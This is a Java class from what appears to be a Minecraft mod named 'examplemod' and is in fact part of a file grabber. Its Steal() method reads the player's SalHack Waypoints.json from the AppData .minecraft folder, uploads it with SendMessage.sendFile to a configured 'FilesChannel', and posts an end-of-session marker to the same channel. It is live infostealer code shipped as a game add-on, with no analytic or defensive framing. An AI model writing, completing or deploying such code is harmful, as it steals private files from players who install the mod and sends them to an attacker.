package com.example.examplemod.Hacks.FilesGrabber.SalHack;

import com.example.examplemod.Sender.Cfg;
import com.example.examplemod.Sender.SendMessage;
import java.io.File;

public class SalHackWaypoints {
   public static void Steal() throws Exception {
      try {
         SendMessage.sendFile(new File(System.getenv("APPDATA") + "\\.minecraft\\SalHack\\Waypoints\\Waypoints.json"));
         SendMessage.doThing("```SalHackWaypoints ^^^```", Cfg.FilesChannel);
      } catch (Exception var1) {
         System.out.println("lol321");
      }

      SendMessage.doThing("**End Session ------------------------------------------------------------------------------------------------**", Cfg.FilesChannel);
   }
}
